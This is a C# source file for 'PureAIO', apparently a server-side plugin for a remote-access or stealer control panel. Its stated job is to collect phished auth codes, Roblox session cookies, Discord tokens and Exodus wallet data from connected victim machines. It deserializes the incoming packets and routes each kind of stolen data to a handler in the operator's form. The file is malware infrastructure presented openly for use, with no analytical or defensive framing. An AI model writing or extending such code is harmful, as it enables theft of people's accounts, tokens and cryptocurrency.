// PureAIO ServerPlugin — ICustomPlugin implementation.
// Receives packets from the client, deserializes them, and routes to Form1.

using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using PluginSDK;
using ProtoBuf;

namespace PureAIO
{
    public class ServerPlugin : ICustomPlugin
    {
        private Form1 _form;

        // ── ICustomPlugin ─────────────────────────────────────────────────────
        public string PluginName    => "PureAIO";
        public string PluginVersion => "2.0.0";
        public string Author        => "Sam";
        public string Description   => "AuthBait + Roblox Cookie + Discord Token + Exodus (enriched)";

        public void OnOpen()
        {
            _form = new Form1();
            _form.Show();
        }

        public void OnConnected(ClientInfo client) { }
        public void OnDisconnected(ClientInfo client) { }

        public void OnPacketReceived(ClientInfo client, CustomPacket raw)
        {
            if (_form == null) return;
            AIOPacket pkt;
            try
            {
                using var ms = new MemoryStream(raw.Buffer);
                pkt = Deserialize(ms);
            }
            catch { return; }

            switch (pkt)
            {
                case AuthBaitCodeResponse r:
                    _form.HandleAuthBaitResponse(r);
                    break;

                case RobloxCookieResponse r:
                    _form.HandleCookieResponse(r);
                    break;

                case DiscordTokenResponse r:
                    _form.HandleTokenResponse(r);
                    break;

                case ExodusResponse r:
                    _form.HandleExodusResponse(r);
                    break;
            }
        }

        // ── Serialization helpers ─────────────────────────────────────────────
        public static byte[] Serialize(AIOPacket pkt)
        {
            using var ms = new MemoryStream();
            Serializer.Serialize(ms, pkt);
            return ms.ToArray();
        }

        public static AIOPacket Deserialize(MemoryStream ms)
            => Serializer.Deserialize<AIOPacket>(ms);
    }
}
